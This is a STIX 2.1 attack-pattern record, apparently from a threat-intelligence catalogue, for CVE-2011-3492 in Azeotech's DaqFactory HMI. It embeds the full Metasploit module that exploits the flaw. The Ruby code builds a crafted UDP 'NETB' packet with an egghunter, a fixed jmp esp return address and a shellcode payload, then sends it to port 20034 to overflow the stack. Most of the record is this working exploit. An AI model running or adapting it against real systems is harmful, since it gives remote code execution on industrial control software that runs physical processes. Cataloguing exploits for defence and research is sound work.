{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ff23de74-4a17-41e3-a65d-9b5a65973895",
    "created": "2024-08-14T16:39:30.001113Z",
    "modified": "2024-08-14T16:39:30.001117Z",
    "name": "DaqFactory HMI NETB Request Overflow",
    "description": " This module exploits a stack buffer overflow in Azeotech's DaqFactory product. The specific vulnerability is triggered when sending a specially crafted 'NETB' request to port 20034. Exploitation of this vulnerability may take a few seconds due to the use of egghunter.  This vulnerability was one of the 14 releases discovered by researcher Luigi Auriemma. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/scada/daq_factory_bof.rb",
            "external_id": "daq_factory_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-3492"
        },
        {
            "source_name": "reference",
            "url": "http://aluigi.altervista.org/adv/daqfactory_1-adv.txt"
        },
        {
            "source_name": "reference",
            "url": "https://www.cisa.gov/uscert/ics/advisories/ICSA-11-264-01"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::Udp\n  include Msf::Exploit::Remote::Egghunter\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'DaqFactory HMI NETB Request Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Azeotech's DaqFactory\n        product. The specific vulnerability is triggered when sending a specially crafted\n        'NETB' request to port 20034. Exploitation of this vulnerability may take a few\n        seconds due to the use of egghunter.  This vulnerability was one of the 14\n        releases discovered by researcher Luigi Auriemma.\n      },\n      'Author'         =>\n        [\n          'Luigi Auriemma',  # Initial discovery, crash poc\n          'mr_me <steventhomasseeley[at]gmail.com>',  # msf exploit\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2011-3492'],\n          [ 'OSVDB', '75496'],\n          [ 'URL', 'http://aluigi.altervista.org/adv/daqfactory_1-adv.txt'],\n          [ 'URL', 'https://www.cisa.gov/uscert/ics/advisories/ICSA-11-264-01']\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 600,\n          'BadChars' => \"\\x00\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [\n            'DAQFactory Pro 5.85 Build 1853 on Windows XP SP3',\n            {\n              'Ret' => 0x100B9EDF,  # jmp esp PEGRP32A.dll\n              'Offset' => 636,\n            }\n          ],\n        ],\n      'DisclosureDate' => '2011-09-13',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        # Required for EIP offset\n        OptString.new('DHCP', [ true, \"The DHCP server IP of the target\", \"\" ]),\n        Opt::RPORT(20034)\n      ])\n  end\n\n  def exploit\n    connect_udp\n\n    print_status(\"Trying target #{target.name}...\")\n\n    eggoptions ={\n      :checksum => false,\n      :eggtag => 'scar',\n    }\n\n    # Correct the offset according to the 2nd IP (DHCP) length\n    iplen = datastore['DHCP'].length\n    offset = 93-iplen\n\n    if offset >= 80\n      pktoffset = offset - 80\n      finaloffset = target['Offset']-pktoffset\n    elsif offset <= 79\n      pktoffset = 80 - offset\n      finaloffset = target['Offset']+pktoffset\n    end\n\n    # springboard onto our unmodified payload\n    p = Rex::Arch::X86.jmp(750) + payload.encoded\n    hunter,egg = generate_egghunter(p, payload_badchars, eggoptions)\n\n    sploit  = \"NETB\"  # NETB request overflow\n    sploit << rand_text_alpha_upper(233)\n    sploit << \"\\x00\"  # part of the packet structure\n    sploit << rand_text_alpha_upper(offset)  # include the offset for the DHCP address\n    sploit << make_nops(2)\n    sploit << hunter\n    sploit << rand_text_alpha_upper(52-hunter.length-2)\n    sploit << [target.ret].pack(\"V\")\n    sploit << rand_text_alpha_upper(12)\n    sploit << Rex::Arch::X86.jmp_short(-70)\n    sploit << egg\n    # packetlen needs to be adjusted to a max of 0x400 as per advisory\n    sploit << rand_text_alpha_upper(finaloffset-egg.length)\n\n    # The use of rand_text_alpha_upper() ensures we always get the same length for the\n    # first IP address.\n    sploit[12,4] = rand_text_alpha_upper(4)\n\n    udp_sock.put(sploit)\n\n    handler\n    disconnect_udp\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-09-13",
    "x_mitre_platforms": [
        "win'"
    ]
}